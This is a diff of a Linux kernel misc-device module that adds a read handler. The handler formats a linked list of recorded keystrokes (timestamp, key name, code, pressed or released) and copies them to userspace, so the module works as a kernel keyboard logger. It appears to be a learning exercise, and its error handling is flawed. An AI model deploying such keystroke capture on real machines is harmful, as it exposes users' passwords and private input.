@@ -1,16 +1,19 @@
-#include "misc.h"
+#include "keyboard.h"
 
-static int	misc_open(struct inode *inode, struct file *filp);
-static int	misc_release(struct inode *inode, struct file *filp);
+static int		misc_open(struct inode *inode, struct file *filp);
+static int		misc_release(struct inode *inode, struct file *filp);
+static ssize_t	misc_read(struct file *filp, char *buffer, size_t length, loff_t *offset);
 
 static struct miscdevice		misc_device;
 const struct file_operations	f_ops = {
 	.owner = THIS_MODULE,
 	.open = misc_open,
 	.release = misc_release,
-	/*.read = misc_read,*/
+	.read = misc_read,
 	/*.write = misc_write,*/
 };
+
+extern t_key	*first;
 
 static int	misc_open(struct inode *inode, struct file *filp)
 {
@@ -24,22 +27,38 @@ static int	misc_release(struct inode *inode, struct file *filp)
 	return 0;
 }
 
-/*static ssize_t		misc_read(struct file *filp,*/
-			/*char *buffer,*/
-			/*size_t length,*/
-			/*loff_t *offset)*/
-/*{*/
-	/*if (*offset == 0 && length > LOGIN_LEN) {*/
-		/*if (copy_to_user(buffer, LOGIN, LOGIN_LEN) != 0) {*/
-			/*pr_info("copy_to_user() failure");*/
-			/*return -1;*/
-		/*}*/
-		/**offset = LOGIN_LEN;*/
-		/*return LOGIN_LEN;*/
-	/*}*/
-	/*pr_debug("buffer = %s\n", buffer);*/
-	/*return 0;*/
-/*}*/
+static ssize_t		misc_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
+{
+	t_key	*tmp = first;
+	char	*log = NULL;
+	char	buff[128] = {0};
+	size_t	len	= 0;
+
+	while (tmp) {
+		sprintf(buff, "%.2lu:%.2lu:%.2lu, %12s, (%02d), %s\n",
+				(tmp->time.tv_sec / 3600) % (24), (tmp->time.tv_sec / 60) % (60),
+				tmp->time.tv_sec % 60, tmp->name, tmp->key, tmp->state ? "pressed" : "released");
+
+		if (log == NULL) {
+			log = (char *)kcalloc(strlen(buff) + 1, sizeof(char), GFP_KERNEL);
+		} else {
+			log = (char *)krealloc(log, strlen(log) + strlen(buff) + 1, GFP_KERNEL);
+		}
+		if (log == NULL)
+			return -1;
+
+		log = strcat(log, buff);
+
+		tmp = tmp->next;
+	}
+
+	if (log != NULL) {
+		len = simple_read_from_buffer(buffer, length, offset, log, strlen(log));
+		kfree(log);
+	}
+
+	return len;
+}
 
 int	create_misc(void)
 {
